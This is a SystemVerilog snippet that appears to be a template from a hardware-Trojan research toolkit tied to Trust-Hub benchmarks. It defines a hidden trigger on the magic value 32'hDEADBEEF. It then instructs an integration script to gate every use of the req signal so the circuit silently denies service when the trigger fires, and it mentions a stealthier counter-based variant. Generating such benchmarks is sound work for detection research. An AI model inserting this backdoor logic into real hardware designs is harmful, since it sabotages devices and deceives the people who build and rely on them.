/**
 * Combinational DoS Trojan - Code Snippet
 * 
 * Trust-Hub Category: Denial of Service ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
 * 
 * Description:
 *   Disables a control signal combinationally when a specific input
 *   pattern is detected. No clock needed - trigger fires immediately
 *   whenever req matches the magic pattern.
 *   AES-T1800: forces AES operation to halt on specific key value.
 *   
 * NOTE: This is for COMBINATIONAL modules only (no clock/registers).
 *       For sequential modules, use the sequential/dos_template.sv instead
 *       which uses a counter-based trigger for better stealth.
 *
 * Trigger: Pattern match on req
 * Payload: Block req when pattern detected
 *
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Combinational - immediate pattern match)
// ============================================================

// Magic value that activates the trojan
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

// Trojan fires instantly whenever trigger signal equals magic pattern
wire trojan_active;
assign trojan_active = (req == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// DoS Attack: Block req combinationally when trojan fires.
//
// Integration Script Must:
//   Find all conditions using req, e.g.:
//     if (req) begin
//     assign output = req & other;
//
//   Replace each with:
//     if (req && !trojan_active) begin
//     assign output = (req && !trojan_active) & other;
//
// Manual Example (combinational ALU enable):
//   Find:    assign result_valid = req & op_done;
//   Replace: assign result_valid = (req && !trojan_active) & op_done;
//
// Effect: When req == 32'hDEADBEEF:
//   trojan_active = 1 combinationally (no delay)
//   req is forced to 0 regardless of actual value
//   Result: Instant Denial of Service on magic input pattern!